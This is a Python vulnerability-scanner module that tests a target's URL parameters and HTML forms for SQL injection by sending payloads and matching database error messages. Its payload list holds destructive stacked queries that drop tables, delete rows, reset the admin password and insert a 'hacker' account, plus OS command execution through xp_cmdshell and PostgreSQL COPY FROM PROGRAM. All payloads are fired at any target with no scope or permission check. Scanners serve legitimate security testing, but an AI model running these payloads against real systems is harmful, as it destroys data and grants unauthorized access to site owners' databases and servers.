"""
SQL Injection scanner module.

Tests for SQL injection vulnerabilities by sending payloads and analyzing responses.
"""

import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs

class SQLInjectionScanner:
    """Scanner for detecting SQL Injection vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the SQL Injection scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # SQL injection payloads to test - expanded with more aggressive techniques
        self.payloads = [
            # Basic authentication bypass
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "1' OR '1'='1",
            "admin' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1--",
            "')) OR (('1'='1--",
            
            # Error-based SQL injection
            "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT user()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND (SELECT 2*IF((SELECT * FROM (SELECT CONCAT(0x3a,(SELECT user()),0x3a,0x3a)) s), 1, 0))-- -",
            "AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))",
            "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x3a,user(),0x3a)) USING utf8)))",
            
            # Time-based blind SQL injection
            "' AND (SELECT * FROM (SELECT(SLEEP(1)))a) --",
            "' AND SLEEP(1) --",
            "' WAITFOR DELAY '0:0:3' --",
            "1' WAITFOR DELAY '0:0:3' --",
            "'; WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "'; SELECT pg_sleep(3) --",
            "'; SELECT SLEEP(3) --",
            
            # Union-based SQL injection
            "' UNION SELECT null,null,null,null,null--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,@@version--",
            "' UNION SELECT username,password,3,4,5 FROM users--",
            "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3a,0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,0x3a)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; DELETE FROM users--",
            
            # Database specific payloads
            # MySQL
            "' OR 1=1 -- -",
            "' OR 1=1 ORDER BY 10-- -",
            "' PROCEDURE ANALYSE()-- -",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- -",
            
            # SQL Server
            "' OR 1=1 -- ",
            "'; EXEC xp_cmdshell('net user')-- ",
            "'; EXEC master..xp_cmdshell 'net user'-- ",
            
            # PostgreSQL
            "' OR 1=1; -- ",
            "'; SELECT pg_sleep(5)-- ",
            "'; CREATE TEMP TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- ",
            
            # Oracle
            "' OR 1=1 -- ",
            "' UNION SELECT banner FROM v$version-- ",
            "' UNION SELECT DISTINCT table_name FROM all_tables-- ",
            
            # SQLite
            "' OR 1=1 -- ",
            "' UNION SELECT sqlite_version()-- ",
            "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'-- "
        ]
        
        # Error patterns indicating successful SQL injection
        self.sql_error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"SQLServerException",
            r"Unclosed quotation mark after the character string",
            r"SQLITE_ERROR",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"DB2 SQL error",
            r"JDBC.*DB2",
            r"CLI Driver.*DB2"
        ]
        
        # Compile regex patterns
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]
    
    def _extract_forms(self, url):
        """
        Extract all forms from a URL.
        
        Args:
            url (str): The URL to extract forms from
            
        Returns:
            list: List of dictionaries containing form details
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action', '')
                form_details['action'] = urljoin(url, action) if action else url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting forms from {url}: {str(e)}")
            return []
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _scan_get_parameters(self, url):
        """
        Test URL GET parameters for SQL injection vulnerabilities.
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        parameters = self._extract_parameters(url)
        if not parameters:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing GET parameters in URL: {url}")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        for param_name, param_values in parameters.items():
            for payload in self.payloads:
                test_url = f"{base_url}?{param_name}={payload}"
                
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing payload on parameter '{param_name}': {payload}")
                    
                    response = requests.get(
                        test_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Parameter '{param_name}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'details': detail,
                            'severity': 'High'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this parameter
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing GET parameter '{param_name}': {str(e)}")
        
        return vulnerabilities
    
    def _scan_form(self, form_details, url):
        """
        Test a form for SQL injection vulnerabilities.
        
        Args:
            form_details (dict): Form details including inputs
            url (str): The URL containing the form
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        if not form_details['inputs']:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing form on URL: {url}, Action: {form_details['action']}")
        
        for payload in self.payloads:
            # We'll test each input field one by one
            for input_field in form_details['inputs']:
                # Skip non-text inputs (checkboxes, submit buttons, etc.)
                if input_field['type'] not in ['text', 'search', 'email', 'url', 'password', 'hidden', '']:
                    continue
                
                # Prepare data for the form submission
                data = {}
                for input_tag in form_details['inputs']:
                    if input_tag['name'] == input_field['name']:
                        data[input_tag['name']] = payload
                    elif input_tag['type'] != 'submit':  # Handle other non-submit inputs
                        data[input_tag['name']] = input_tag['value']
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing form field '{input_field['name']}' with payload: {payload}")
                
                try:
                    if form_details['method'] == 'post':
                        response = requests.post(
                            form_details['action'],
                            data=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # GET
                        response = requests.get(
                            form_details['action'],
                            params=data,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Form field '{input_field['name']}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': form_details['method'].upper(),
                            'form_action': form_details['action'],
                            'parameter': input_field['name'],
                            'payload': payload,
                            'details': detail,
                            'severity': 'High'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this field
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing form field '{input_field['name']}': {str(e)}")
        
        return vulnerabilities
    
    def _check_sql_errors(self, response_content):
        """
        Check if the response contains SQL error messages.
        
        Args:
            response_content (str): The response content to check
            
        Returns:
            bool: True if SQL error patterns are found, False otherwise
        """
        for pattern in self.compiled_patterns:
            if pattern.search(response_content):
                return True
        return False
    
    def scan(self):
        """
        Start the SQL injection vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting SQL injection scan on {self.target_url}")
        
        # Test GET parameters in the main URL
        vulnerabilities.extend(self._scan_get_parameters(self.target_url))
        
        # Extract and test forms
        forms = self._extract_forms(self.target_url)
        for form in forms:
            vulnerabilities.extend(self._scan_form(form, self.target_url))
        
        # If depth > 1, we could crawl for more links and forms
        # (simplified implementation for brevity)
        
        if self.logger:
            self.logger.info(f"SQL injection scan completed. Found {len(vulnerabilities)} vulnerabilities.")
        
        return vulnerabilities
